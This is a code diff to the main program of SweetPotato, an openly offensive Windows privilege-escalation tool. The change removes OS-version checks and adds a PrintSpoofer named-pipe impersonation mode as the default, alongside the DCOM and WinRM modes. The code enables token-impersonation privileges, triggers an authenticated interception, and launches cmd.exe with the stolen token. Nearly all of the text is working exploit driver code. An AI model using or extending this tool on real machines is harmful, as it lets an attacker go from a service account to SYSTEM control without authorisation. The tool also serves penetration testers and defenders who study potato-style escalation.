@@ -13,44 +13,6 @@ namespace SweetPotato {
             options.WriteOptionDescriptions(Console.Out);
         }
 
-        public static string HKLM_GetString(string path, string key) {
-            try {
-                RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
-                if (rk == null) return "";
-                return (string)rk.GetValue(key);
-            } catch { return ""; }
-        }
-
-        //https://stackoverflow.com/questions/6331826/get-os-version-friendly-name-in-c-sharp
-        public static string FriendlyName() {
-            string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
-            string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
-            if (ProductName != "") {
-                return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
-                            (CSDVersion != "" ? " " + CSDVersion : "");
-            }
-            return "";
-        }
-
-        static bool IsBITSRequired() {
-
-            if(Environment.OSVersion.Version.Major < 10) {
-                return false;
-            }
-
-            string friendlyName = FriendlyName();
-
-            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-            var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());
-
-            if( (buildNumber <= 1809 && friendlyName.Contains("Windows 10")) ||
-                buildNumber < 1809 && friendlyName.Contains("Windows Server")){
-                return false;
-            }
-
-            return true;        
-        }
-
         static void Main(string[] args) {
 
             string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
@@ -58,13 +20,15 @@ namespace SweetPotato {
             string program = @"c:\Windows\System32\cmd.exe";
             string programArgs = null;
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
+            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
             bool showHelp = false;
             bool isBITSRequired = false;
 
             Console.WriteLine(
                 "SweetPotato by @_EthicalChaos_\n" +
                  "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
-                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n"
+                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n" + 
+                 "  PrintSpoofer discovery and original exploit by @itm4n"
                 );
 
             OptionSet option_set = new OptionSet()
@@ -72,6 +36,7 @@ namespace SweetPotato {
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                 .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
+                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|PrintSpoofer(default)] ", v => mode = v)
                 .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
@@ -92,17 +57,12 @@ namespace SweetPotato {
 
             try {
 
-                if ( isBITSRequired = IsBITSRequired()) {
-                    clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
-                    Console.WriteLine("[=] Your version of Windows fixes DCOM interception forcing BITS to perform WinRM intercept");
-                }
-
                 bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                 bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                 bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);
 
                 if(!hasImpersonate && !hasPrimary) {
-                    Console.WriteLine("[!] Cannot perform NTLM interception, neccessary priveleges missing.  Are you running under a Service account?");
+                    Console.WriteLine("[!] Cannot perform interception, neccessary priveleges missing.  Are you running under a Service account?");
                     return;
                 }
 
@@ -114,12 +74,16 @@ namespace SweetPotato {
                     }
                 }
 
-                Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}", 
-                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 :  port, executionMethod, program);
+                if (mode == PotatoAPI.Mode.PrintSpoofer) {
+                    Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}");
+                } else {
+                    Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}",
+                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 : port, executionMethod, program);
+                }
 
-                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, isBITSRequired);
+                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
 
-                if (!potatoAPI.TriggerDCOM()) {
+                if (!potatoAPI.Trigger()) {
                     Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                     return;
                 }
@@ -141,7 +105,7 @@ namespace SweetPotato {
                     si.cb = Marshal.SizeOf(si);
                     si.lpDesktop = @"WinSta0\Default";
 
-                    Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
+                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
 
                     string finalArgs = null;
 
